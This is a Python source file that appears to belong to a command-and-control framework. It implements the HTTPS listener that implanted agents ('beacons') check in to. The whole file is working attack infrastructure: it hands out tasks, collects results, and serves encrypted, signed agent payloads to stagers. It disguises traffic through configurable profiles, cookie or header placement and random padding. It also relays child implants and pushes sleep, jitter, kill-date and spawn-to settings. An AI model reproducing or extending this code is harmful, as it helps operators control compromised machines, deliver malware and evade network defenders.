"""HTTP listener for beacon check-ins.

Serves three endpoints on a dedicated TLS port. Reuses the handler's
TLS context so certificate rotation and cipher hardening apply
uniformly. The listener runs on a daemon thread; there is no clean
shutdown API because werkzeug does not support one from an external
thread — the daemon dies with the process.
"""

from __future__ import annotations

import logging
import ssl
import threading
import time
from typing import Optional

from flask import Flask, Response, jsonify, request

import base64 as _b64
import json
import os as _os
import secrets as _secrets

from .transport.base import Transport

try:
    from ..quiet_werkzeug import QuietWSGIRequestHandler
except ImportError:

    QuietWSGIRequestHandler = None

_PAD_BUCKETS = (512, 1024, 2048, 4096)
_HANDSHAKE_LOCK = threading.Lock()
_HANDSHAKE_STATE: dict = {}
_HANDSHAKE_RATE = 30.0      # sustained tokens per second
_HANDSHAKE_BURST = 100.0    # peak


def _pad_body(body: bytes, target_len: int) -> bytes:
    """Return `body` followed by JSON-compatible padding to reach
    approximately `target_len` bytes. The pad is a base64 string
    wrapped in a `"_pad"` field; JSON parsers on both sides ignore
    unknown fields, so the padding is transparent to the protocol.

    Bodies within ~12 bytes of `target_len` are returned unchanged —
    the wrapper itself would not fit. In practice the check-in and
    task-list bodies are far below every bucket, so this floor is
    never hit in normal operation."""
    if len(body) >= target_len:
        return body

    wrapper = b',"_pad":"'
    wrapper_close = b'"}'
    remaining = (target_len - len(body)
                 - len(wrapper) - len(wrapper_close) + 1)
    if remaining <= 0:
        return body

    pad_chars = remaining
    raw_bytes = (pad_chars // 4) * 3
    pad = _b64.b64encode(_secrets.token_bytes(raw_bytes))

    while len(pad) < pad_chars:
        pad += _b64.b64encode(_secrets.token_bytes(3))
    pad = pad[:pad_chars]
    return body[:-1] + wrapper + pad + wrapper_close

log = logging.getLogger(__name__)


class BeaconListener(Transport):

    name = 'http'

    def __init__(self, engine, host: str, port: int,
                 certfile: str, keyfile: str,
                 client_ca: str = None,
                 extra_paths: dict = None,
                 c2_profile_dir: str = None,
                 profile_filter: str = None):
        """client_ca:       if set, the listener requires a client
                         certificate signed by this CA. Mutual TLS.
                         If None, server-only TLS.

        extra_paths:     optional dict mapping {"beacon": ..., "tasks":
                         ..., "results": ...} to URLs. Additional to the
                         auto-discovered profile paths. Kept for tests
                         and for callers that want to inject paths
                         without touching the filesystem.

        c2_profile_dir:  directory to scan for C2 profile JSON files.
                         Defaults to the same location the builder
                         uses, so the two sides always agree.

        profile_filter:  optional name (without .json). When set, only
                         that profile's paths are registered. When None
                         (the default), every profile in the directory
                         is scanned — an agent built with any profile
                         can check in against a listener that was
                         started without a matching flag.
        """
        super().__init__(engine, host, port, config={
            'certfile': certfile, 'keyfile': keyfile,
            'client_ca': client_ca,
        })

        self.certfile = certfile
        self.keyfile = keyfile
        self.client_ca = client_ca
        self.extra_paths = extra_paths or {}
        self.profile = {
            'beacon_path':  '/beacon',
            'tasks_path':   '/tasks',
            'results_path': '/results',
        }

        if c2_profile_dir is None:
            try:
                from .builder import DEFAULT_C2_PROFILE_DIR
                c2_profile_dir = DEFAULT_C2_PROFILE_DIR
            except Exception:
                c2_profile_dir = None
        self.c2_profile_dir = c2_profile_dir
        self.profile_filter = profile_filter
        self._status_codes = {
            'beacon':  200,
            'tasks':   200,
            'results': 204,
            'error':   404,
        }
        self._cookie_name = 'sid'
        self._response_headers = {}
        self._stager_path = ''
        self._path_options: dict = {}
        self._path_shapes = self._build_path_shapes(
            c2_profile_dir, profile_filter)
        self._app = self._build_app()
        self._thread: Optional[threading.Thread] = None
        self._pruner: Optional[threading.Thread] = None
        self._pruner_stop = threading.Event()
        self._running = False

        try:
            from .stager import PayloadRegistry
            self._payloads = PayloadRegistry()
        except Exception:
            self._payloads = None

    def _resolve_session_id(self, presenting_sid: int) -> int:
        """Return the session id the request should be routed to.

        INVARIANT: on a relayed request, the Cookie header carries
        the PARENT's session cookie, not the child's. The child is
        identified solely by the X-Relay-Child fingerprint header.
        A child that presented its own cookie would be resolved to
        its own session anyway — the header would have no effect —
        so the two cases are indistinguishable from the server's
        point of view. The Go relay preserves this invariant by
        forwarding every frame over the parent's own transport.

        By default this is the presenting beacon's session. When
        the request carries X-Relay-Child, the presenting beacon
        must be a live, authorised relay — its own session must
        exist and its role must permit relaying — and the routing
        target becomes the child's session. The child session is
        created on first relayed check-in, not here.

        A relay request against a nonexistent child is refused by
        returning the presenting sid unchanged; the child's
        /beacon handler will create it.

        If the Go relay's frame format ever changes so that the
        child's own cookie rides along, this method is where the
        routing decision would need to change.
        """
        child_fp = request.headers.get('X-Relay-Child')
        if not child_fp:
            return presenting_sid

        parent = self.engine.get(presenting_sid)
        if parent is None:
            return presenting_sid

        child = self.engine.session_by_fingerprint(child_fp)
        if child is not None:
            return child.id

        return presenting_sid

    def _build_path_shapes(self, directory, profile_filter):
        """Build a per-path mapping for the listener.

        Returns {path: entry} where entry is a dict with:
            role              one of the three shaping roles
            shape             the shaping spec for that role, or None
            status_codes      {'beacon': int, 'tasks': int,
                               'results': int, 'error': int}
            cookie_name       str
            response_headers  {name: value}
            stager_path       str (may be '')

        Every value is resolved against the profile that declared
        the path, not against a global "last profile wins". A
        listener serving thirty profiles must answer each request
        with the profile that owns its path; a global would apply
        one profile's cookie name to another profile's sessions.
        """
        import json as _json
        import os as _os

        if not directory or not _os.path.isdir(directory):
            return {}

        if profile_filter:
            stem = profile_filter[:-5] if profile_filter.endswith(
                '.json') else profile_filter
            names = [stem + '.json']
        else:
            try:
                names = sorted(
                    e for e in _os.listdir(directory)
                    if e.endswith('.json')
                    and not e.startswith('.'))
            except OSError:
                return {}

        # Per-profile options, keyed by the profile's own paths.
        path_options: dict = {}

        for name in names:
            try:
                with open(_os.path.join(directory, name), 'r',
                          encoding='utf-8') as fh:
                    prof = _json.load(fh)
            except (OSError, ValueError):
                continue

            statuses = prof.get('status') or {}
            status_codes = {
                'beacon': 200, 'tasks': 200,
                'results': 204, 'error': 404,
            }
            if isinstance(statuses, dict):
                for role in ('beacon', 'tasks', 'results', 'error'):
                    try:
                        code = int(statuses.get(role, 0))
                    except (TypeError, ValueError):
                        code = 0
                    if 100 <= code <= 599:
                        status_codes[role] = code

            cname = (prof.get('cookie_name') or '').strip()
            if not (cname and all(
                    c.isalnum() or c in '._-' for c in cname)):
                cname = 'sid'

            response_headers: dict = {}
            rh = prof.get('response_headers') or {}
            if isinstance(rh, dict):
                for k, v in rh.items():
                    if (isinstance(k, str) and k
                            and isinstance(v, str)
                            and not any(ch in k
                                        for ch in ('\r', '\n', '\0'))
                            and not any(ch in v
                                        for ch in ('\r', '\n', '\0'))):
                        response_headers[k] = v

            stager_path = ''
            stager = prof.get('stager') or {}
            if isinstance(stager, dict):
                spath = (stager.get('path') or '').strip()
                if spath.startswith('/'):
                    stager_path = spath

            shaping = prof.get('shaping') or {}
            if not isinstance(shaping, dict):
                shaping = {}

            pairs = (
                ('checkin_response', 'beacon_path',
                 'checkin_response'),
                ('tasks_response',   'tasks_path',
                 'tasks_response'),
                ('results_request',  'results_path',
                 'results_request'),
            )
            for role, path_key, shape_key in pairs:
                path = (prof.get(path_key) or '').strip()
                if not path.startswith('/'):
                    continue
                bare = path.split('?', 1)[0]
                if bare in ('/beacon', '/tasks', '/results'):
                    continue
                if bare in path_options:
                    continue
                spec = shaping.get(shape_key)
                if not isinstance(spec, dict):
                    spec = None
                path_options[bare] = {
                    'role':             role,
                    'shape':            spec,
                    'status_codes':     dict(status_codes),
                    'cookie_name':      cname,
                    'response_headers': dict(response_headers),
                    'stager_path':      stager_path,
                }

        defaults = {
            'beacon':  '/beacon',
            'tasks':   '/tasks',
            'results': '/results',
        }
        for role, path in defaults.items():
            if path in path_options:
                continue
            path_options[path] = {
                'role':             role,
                'shape':            None,
                'status_codes':     {
                    'beacon': 200, 'tasks': 200,
                    'results': 204, 'error': 404,
                },
                'cookie_name':      'sid',
                'response_headers': {},
                'stager_path':      '',
            }

        self._path_options = path_options
        return path_options

    def _options_for_path(self, path: str) -> dict:
        """Return the per-profile options for this request path.

        Falls back to a default entry when the path is not in the
        map — an agent hitting a route that was not registered, or
        a default-path agent that the profile scan did not cover.
        The defaults reproduce the historical pre-profile
        behaviour, so a caller that cannot find its path is never
        worse off than before.
        """
        opts = self._path_options.get(path)
        if opts is not None:
            return opts
        return {
            'role':             None,
            'shape':            None,
            'status_codes':     {
                'beacon': 200, 'tasks': 200,
                'results': 204, 'error': 404,
            },
            'cookie_name':      'sid',
            'response_headers': {},
            'stager_path':      '',
        }

    def _shape_for(self, path: str, role: str):
        """Return the shape spec for the current request, or None.

        `path` is request.path (query string stripped). `role` is
        the shape key the caller wants: 'checkin_response',
        'tasks_response', or 'results_request'. A mismatch means
        the request arrived on a path belonging to a different
        role — which should not happen with correct route
        registration — and returns None so the caller falls
        through to the plain-JSON path.
        """
        opts = self._options_for_path(path)
        if opts.get('role') != role:
            return None
        return opts.get('shape')

    def _status_for(self, role: str) -> int:
        """Return the HTTP status code for a role, using the
        profile that owns request.path.

        Falls back to the historical framework defaults when the
        path is not in the map, so a default-path agent sees the
        same values it always did.
        """
        opts = self._options_for_path(request.path)
        return opts['status_codes'].get(role, 200)

    def _apply_placement(self, resp, spec, body_bytes):
        """Return a Response with the payload moved to the location
        the profile's `placement` block names.

        Currently supports three kinds:

          * body (default) — the payload is the body. No change.
          * header         — the payload is the named response
                             header, and the body becomes a `{}`
                             stub.
          * cookie         — the payload is the named cookie value,
                             and the body becomes a `{}` stub.

        A profile that names an unsupported kind, or one whose
        name field is malformed, falls through to body — the
        request succeeds with the historical response shape
        rather than failing on a bad profile.

        A `None` spec means the request hit a path with no
        shaping block. Nothing to place; return the response
        unchanged.
        """
        if spec is None:
            return resp

        try:
            from flask import request as _req
            if _req.environ.get('TORNADO_WS'):
                return resp
        except Exception:
            pass
        pl = spec.get('placement') or {}
        if not isinstance(pl, dict):
            return resp
        kind = (pl.get('kind') or 'body').strip().lower()
        if kind in ('', 'body'):
            return resp

        try:
            payload_str = body_bytes.decode('utf-8',
                                            errors='replace')
        except Exception:
            return resp

        if kind == 'header':
            name = (pl.get('name') or '').strip()
            if name and all(c.isalnum() or c in '-_' for c in name):
                resp.headers[name] = payload_str
                resp.set_data(b'{}')
            return resp

        if kind == 'cookie':
            name = (pl.get('name') or 'session').strip()
            if name and all(c.isalnum() or c in '-_' for c in name):
                resp.headers['Set-Cookie'] = (
                    f'{name}={payload_str}; Path=/; Secure')
                resp.set_data(b'{}')
            return resp

        return resp

    # ------------------------------------------------------------------
    # Route discovery

    def _collect_paths(self, key: str) -> set:
        """Return every value of `key` found in the C2 profile dir.

        key is one of: 'beacon_path', 'tasks_path', 'results_path'.

        When profile_filter is set, only that profile is read. When
        it is None, every *.json in the directory is read, so an
        operator who builds with `--c2-profile chrome` reaches a
        listener that was started without `--beacon-profile`.
        """
        import os as _os
        import json as _json

        result: set = set()
        directory = self.c2_profile_dir
        if not directory or not _os.path.isdir(directory):
            return result

        if self.profile_filter:
            stem = self.profile_filter[:-5] \
                   if self.profile_filter.endswith('.json') \
                   else self.profile_filter
            names = [stem + '.json']
        else:
            try:
                names = [e for e in _os.listdir(directory)
                         if e.endswith('.json') and not e.startswith('.')]
            except OSError:
                return result

        for name in names:
            path = _os.path.join(directory, name)
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    prof = _json.load(f)
            except (OSError, ValueError):
                continue
            val = prof.get(key)
            if val:
                result.add(str(val))
        return result

    def _print_beacon(self, msg: str) -> None:
        """Print with the handler's colors, if reachable."""
        try:
            c = self.engine.handler.colors
            print(f"{c['green']}{msg}{c['end']}")
        except Exception:
            print(msg)

    # ------------------------------------------------------------------
    # Flask application

    def _build_app(self) -> Flask:
        app = Flask(__name__)

        logging.getLogger('werkzeug').setLevel(logging.WARNING)

        @app.route('/beacon', methods=['POST'], endpoint='checkin_default')
        def checkin_default():
            return self._checkin()

        @app.route('/tasks', methods=['GET'], endpoint='tasks_default')
        def tasks_default():
            return self._tasks()

        @app.route('/results', methods=['POST'], endpoint='results_default')
        def results_default():
            return self._results()

        @app.route('/stage/<name>', methods=['GET'],
                   endpoint='stage_default')
        def stage_default(name):
            return self._stage(name)

        # ----------------------------------------------------------------
        # Auto-discovered C2 profile paths.

        handlers = {
            'beacon':  checkin_default,
            'tasks':   tasks_default,
            'results': results_default,
        }
        methods = {
            'beacon':  ['POST'],
            'tasks':   ['GET'],
            'results': ['POST'],
        }
        defaults = {
            'beacon':  '/beacon',
            'tasks':   '/tasks',
            'results': '/results',
        }

        seen: dict = {'beacon': set(), 'tasks': set(), 'results': set()}
        route_seq = 0
        for role, key in (('beacon',  'beacon_path'),
                          ('tasks',   'tasks_path'),
                          ('results', 'results_path')):
            paths = self._collect_paths(key)
            val = self.extra_paths.get(role)
            if val:
                paths.add(val)

            for path in sorted(paths):
                if not path.startswith('/'):
                    self._print_beacon(
                        f"[BEACON] ignoring malformed {role} path: {path!r}"
                    )
                    continue
                if path == defaults[role]:
                    continue
                if path in seen[role]:
                    continue
                seen[role].add(path)
                route_seq += 1
                try:
                    app.add_url_rule(
                        path,
                        endpoint=f"{role}_auto_{route_seq}",
                        view_func=handlers[role],
                        methods=methods[role],
                    )
                    self._print_beacon(
                        f"[BEACON] extra {role} route: {path}"
                    )
                except Exception as exc:
                    self._print_beacon(
                        f"[BEACON] could not register {role} path "
                        f"{path!r}: {exc}"
                    )

        stager_paths = {
            opts.get('stager_path')
            for opts in self._path_options.values()
            if opts.get('stager_path')
        }
        for spath in sorted(stager_paths):
            try:
                @app.route(spath, methods=['GET'],
                           endpoint=f'stage_profile_{spath.replace("/", "_")}')
                def stage_profile_default():
                    from flask import request as _req
                    name = _req.args.get('name', '')
                    if not name:
                        return Response(status=404)
                    return self._stage(name)
                self._print_beacon(f"[BEACON] stager route: {spath}")
            except Exception as exc:
                self._print_beacon(
                    f"[BEACON] could not register stager path "
                    f"{spath!r}: {exc}")

        @app.route('/health', methods=['GET'])
        def health():
            return jsonify({'ok': True})

        return app

    # ------------------------------------------------------------------
    # Wire encryption

    def _unwrap(self):
        """Read the request body and return (payload, shared_key).

        `shared_key` is None when the request is plaintext. When it
        is non-None, the caller must encrypt the response.
        """
        from . import wire
        raw = request.get_json(force=True, silent=True) or {}
        header_epk = request.headers.get('X-ECDH-Pubkey')
        if header_epk and not wire.is_envelope(raw):
            ecdh = getattr(self.engine.handler, 'server_ecdh', None)
            if ecdh is not None:
                try:
                    shared = ecdh.derive_shared(
                        _b64.b64decode(header_epk))
                except Exception as exc:
                    raise ValueError(
                        f'X-ECDH-Pubkey not usable: {exc}')
                return raw, shared
        if not wire.is_envelope(raw):
            return raw, None
        ecdh = getattr(self.engine.handler, 'server_ecdh', None)
        if ecdh is None:
            raise ValueError('encrypted request but no server ECDH')
        epk = raw.get('epk')
        if not epk:
            raise ValueError('envelope missing epk')
        try:
            peer = _b64.b64decode(epk)
            shared = ecdh.derive_shared(peer)
            plain = wire.decrypt(shared, raw)
            inner = json.loads(plain)
        except Exception as exc:
            raise ValueError(f'decrypt failed: {exc}')
        return inner, shared

    def _wrap(self, shared, body_bytes):
        """Encrypt body_bytes if shared is not None. Returns bytes
        suitable for a Response."""
        if shared is None:
            return body_bytes
        from . import wire
        env = wire.encrypt(shared, body_bytes)
        return json.dumps(env).encode('utf-8')

    # ------------------------------------------------------------------

    def _checkin(self) -> Response:
        try:
            payload, shared = self._unwrap()
        except ValueError as exc:
            log.warning("beacon: %s", exc)
            return Response(status=self._status_for('error'))

        child_fp = request.headers.get('X-Relay-Child')
        if child_fp:
            from .engine import _fingerprint
            computed = _fingerprint(payload.get('identity') or {})
            if computed != child_fp:
                log.warning(
                    "beacon relay: fingerprint mismatch "
                    "(header=%s computed=%s)",
                    child_fp[:16], computed[:16])
                return Response(status=400)

        _ident = payload.get('identity') or {}
        payload['addr'] = (_ident.get('local_addr')
                           or request.remote_addr)
        if child_fp:
            parent_sid = self._session_id()
            parent_session = (
                self.engine.get(parent_sid)
                if parent_sid is not None else None)
            payload['_relayed_by'] = parent_sid
            reply = self.engine.handle_relayed_checkin(
                parent_session, payload)
        else:
            reply = self.engine.handle_checkin(payload)

        if reply is None:
            return Response(status=self._status_for('error'))

        try:
            session = self.engine.get(reply.get('id'))
            if session is not None:
                session.transport = 'http'
        except Exception:
            pass

        import json as _json
        spec = self._shape_for(request.path, 'checkin_response')
        if spec is not None:
            from . import shaping as _shp
            shaped = _shp.wrap(
                spec['template'], reply,
                spec.get('encoding', 'base64'))
            raw = _json.dumps(shaped).encode('utf-8')
        else:
            raw = _json.dumps(reply).encode('utf-8')
            bucket = _PAD_BUCKETS[_secrets.randbelow(len(_PAD_BUCKETS))]
            raw = _pad_body(raw, bucket)

        body = self._wrap(shared, raw)
        resp = Response(
            body,
            status=self._status_for('beacon'),
            mimetype='application/json',
        )
        opts = self._options_for_path(request.path)
        cookie = reply.get('cookie') if isinstance(reply, dict) else None
        if cookie:
            resp.headers['Set-Cookie'] = (
                f'{opts["cookie_name"]}={cookie}; '
                f'Path=/; Secure; HttpOnly')
        for _k, _v in opts['response_headers'].items():
            resp.headers[_k] = _v
        return self._apply_placement(resp, spec, body)



    def _tasks(self) -> Response:
        try:
            _, shared = self._unwrap()
        except ValueError as exc:
            log.warning("beacon: _unwrap failed: %s", exc)
            return Response(status=self._status_for('error'))
        sid = self._session_id()
        if sid is None:
            return Response(status=self._status_for('error'))

        if self.engine.get(sid) is None:
            return Response(status=self._status_for('error'))

        sid = self._resolve_session_id(sid)

        tasks = self.engine.pop_tasks(sid)
        task_wire = [t.to_wire() for t in tasks]

        import json as _json
        spec = self._shape_for(request.path, 'tasks_response')
        if spec is not None:
            from . import shaping as _shp
            shaped = _shp.wrap(
                spec['template'], task_wire,
                spec.get('encoding', 'base64'))
            raw = _json.dumps(shaped).encode('utf-8')
            bucket = _PAD_BUCKETS[_secrets.randbelow(len(_PAD_BUCKETS))]
            raw = _pad_body(raw, bucket)
        else:
            raw = _json.dumps(task_wire).encode('utf-8')
            bucket = _PAD_BUCKETS[_secrets.randbelow(len(_PAD_BUCKETS))]
            if len(raw) < bucket:
                if raw == b"[]":
                    pad_len = bucket - 13
                else:
                    pad_len = bucket - len(raw) - 12
                if pad_len > 0:
                    pad_str = _b64.b64encode(
                        _secrets.token_bytes((pad_len // 4) * 3)
                    )[:pad_len].decode('ascii')
                    pad_entry = b'{"_pad":"' + pad_str.encode() + b'"}'
                    if raw == b"[]":
                        raw = b'[' + pad_entry + b']'
                    else:
                        raw = raw[:-1] + b',' + pad_entry + b']'

        raw = self._wrap(shared, raw)
        resp = Response(raw, status=self._status_for('tasks'),
                        mimetype='application/json')

        session = self.engine.get(sid)
        if session is not None:
            resp.headers['X-Beacon-Sleep'] = str(session.sleep_interval)
            resp.headers['X-Beacon-Jitter'] = f"{session.jitter:.4f}"
            if session.kill_deadline:
                resp.headers['X-Beacon-Kill'] = str(
                    int(session.kill_deadline))

            resp.headers['X-Beacon-WorkStart'] = str(session.work_hours_start)
            resp.headers['X-Beacon-WorkEnd'] = str(session.work_hours_end)
            resp.headers['X-Beacon-SpawnTo'] = (
                getattr(session, 'spawn_to', '') or '-')
        opts = self._options_for_path(request.path)
        for _k, _v in opts['response_headers'].items():
            resp.headers[_k] = _v
        return self._apply_placement(resp, spec, raw)


    def _stage(self, name: str) -> Response:
        """Serve a full agent payload to a stager.

        Auth is the same session cookie the stager carries from
        /beacon. Path traversal is impossible: the name is looked up
        in the pre-scanned payload registry, which only knows about
        files in the payloads/ directory.
        """
        sid = self._session_id()
        if sid is None:
            return Response(status=401)

        if self._payloads is None:
            return Response(status=500)
        entry = self._payloads.get(name)

        if entry is None:
            return Response(status=404)

        raw = self._payloads.read(name)
        if not raw:
            return Response(status=500)

        key = self._stage_key_for(name)
        if key is not None:
            try:
                from cryptography.hazmat.primitives.ciphers.aead \
                    import AESGCM
                import os as _os
                nonce = _os.urandom(12)
                aes = AESGCM(key)
                ct = aes.encrypt(nonce, raw, None)
                raw = nonce + ct
            except Exception:
                pass

        sig_hdr = None
        signer = getattr(self.engine.handler, 'signer', None)
        if signer is not None:
            try:
                sig_hdr = _b64.b64encode(
                    signer.sign(raw)).decode('ascii')
            except Exception as exc:
                log.warning("beacon: payload signing failed: %s", exc)
                sig_hdr = None

        resp = Response(raw, status=200,
                        mimetype='application/octet-stream')
        if sig_hdr:
            resp.headers['X-Payload-Sig'] = sig_hdr
        return resp

    def _stage_key_for(self, name: str):
        """Return the 32-byte AES key for a payload, or None.

        Keys are read from payloads/stage_keys.json:
            {"<name>": "<hex 64 chars>", ...}
        """
        import json as _json
        path = 'payloads/stage_keys.json'
        if not _os.path.isfile(path):
            return None
        try:
            with open(path, 'r', encoding='utf-8') as fh:
                data = _json.load(fh)
            hexkey = data.get(name)
            if not hexkey:
                return None
            return bytes.fromhex(hexkey)
        except (OSError, ValueError):
            return None

    def _results(self) -> Response:
        try:
            payload, _ = self._unwrap()
        except ValueError as exc:
            log.warning("beacon: %s", exc)
            return Response(status=self._status_for('error'))
        spec = self._shape_for(request.path, 'results_request')
        if spec is not None:
            from . import shaping as _shp
            try:
                payload = _shp.unwrap(
                    payload, spec['extract'],
                    spec.get('encoding', 'base64'))
            except Exception as exc:
                log.warning("beacon: results shaping: %s", exc)
                return Response(status=self._status_for('error'))
        sid = self._session_id()
        if sid is None:
            return Response(status=self._status_for('error'))
        if self.engine.get(sid) is None:
            return Response(status=self._status_for('error'))
        sid = self._resolve_session_id(sid)
        self.engine.store_result(sid, payload)
        return Response(status=self._status_for('results'))

    def _session_id(self) -> Optional[int]:
        """Return the session id proved by the request's cookie.

        The cookie is the only accepted credential. `X-Beacon-Id` is
        intentionally rejected — session IDs are small monotonic
        integers and accepting them would let anyone who can reach
        the listener enumerate every live session.

        The cookie name is resolved from the profile that owns
        request.path, not from a listener-wide default. With more
        than one profile loaded, two agents on two different
        profiles will each carry a different cookie name; the
        lookup must match the profile whose path the request
        arrived on.
        """
        opts = self._options_for_path(request.path)
        want_name = opts.get('cookie_name') or 'sid'

        cookie_header = request.headers.get('Cookie', '') or ''
        sid_cookie = None
        for pair in cookie_header.split(';'):
            name, _, value = pair.strip().partition('=')
            if name == want_name:
                sid_cookie = value
                break
        if sid_cookie:
            return self.engine.verify_cookie(sid_cookie)
        return None


    # ------------------------------------------------------------------
    # Lifecycle

    def start(self) -> bool:
        ctx = self._make_tls_context()
        if ctx is None:
            return False
        self._pruner_stop.clear()
        self._thread = threading.Thread(
            target=self._run, args=(ctx,), daemon=True,
        )
        self._running = True
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False
        self._pruner_stop.set()
        if self._pruner is not None:
            self._pruner.join(timeout=2.0)
            self._pruner = None

    def _make_tls_context(self) -> Optional[ssl.SSLContext]:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.certfile, self.keyfile)
            ctx.set_alpn_protocols(['http/1.1'])
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2

            if self.client_ca:
                ctx.verify_mode = ssl.CERT_REQUIRED
                ctx.check_hostname = False
                ctx.load_verify_locations(cafile=self.client_ca)
            try:
                ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            except AttributeError:
                pass
            ctx.set_ciphers(
                "ECDHE-ECDSA-AES256-GCM-SHA384:"
                "ECDHE-RSA-AES256-GCM-SHA384:"
                "ECDHE-ECDSA-AES128-GCM-SHA256:"
                "ECDHE-RSA-AES128-GCM-SHA256:"
                "ECDHE-ECDSA-CHACHA20-POLY1305:"
                "ECDHE-RSA-CHACHA20-POLY1305"
            )
            ctx.options |= ssl.OP_NO_COMPRESSION
            ctx.options |= ssl.OP_NO_RENEGOTIATION

            try:
                ctx.options &= ~ssl.OP_NO_TICKET
            except Exception:
                pass
            try:
                ctx.num_tickets = 4
            except Exception:
                pass
            return ctx

        except Exception as exc:
            log.error("beacon: TLS context setup failed: %s", exc)
            return None

    def _run(self, ctx: ssl.SSLContext) -> None:
        try:
            from werkzeug.serving import make_server
        except ImportError:
            log.error("beacon: werkzeug not installed "
                      "(pip install flask)")
            return
        try:
            kwargs = {
                'ssl_context': ctx,
                'threaded': True,
            }
            if QuietWSGIRequestHandler is not None:
                kwargs['request_handler'] = QuietWSGIRequestHandler

            _inner = self._app

            def _rate_limited(environ, start_response):
                peer = environ.get('REMOTE_ADDR', '?')
                now = time.monotonic()
                with _HANDSHAKE_LOCK:
                    tokens, last = _HANDSHAKE_STATE.get(
                        peer, (_HANDSHAKE_BURST, now))
                    refill = (now - last) * _HANDSHAKE_RATE
                    tokens = min(_HANDSHAKE_BURST, tokens + refill)
                    if tokens < 1.0:
                        _HANDSHAKE_STATE[peer] = (tokens, now)
                        start_response(
                            '429 Too Many Requests',
                            [('Content-Type', 'text/plain'),
                             ('Retry-After', '5')])
                        return [b'rate limited\n']
                    _HANDSHAKE_STATE[peer] = (tokens - 1.0, now)
                return _inner(environ, start_response)

            import threading as _threading

            def _prune_loop():
                while not self._pruner_stop.wait(120):
                    cutoff = time.monotonic() - 600
                    with _HANDSHAKE_LOCK:
                        stale = [k for k, (_, last) in
                                 _HANDSHAKE_STATE.items()
                                 if last < cutoff]
                        for k in stale:
                            _HANDSHAKE_STATE.pop(k, None)

            self._pruner = _threading.Thread(
                target=_prune_loop, daemon=True)
            self._pruner.start()

            srv = make_server(
                self.host, self.port, _rate_limited, **kwargs)
            log.info("beacon: listening on %s:%d", self.host, self.port)
            srv.serve_forever()
        except Exception as exc:
            log.error("beacon: listener died: %s", exc)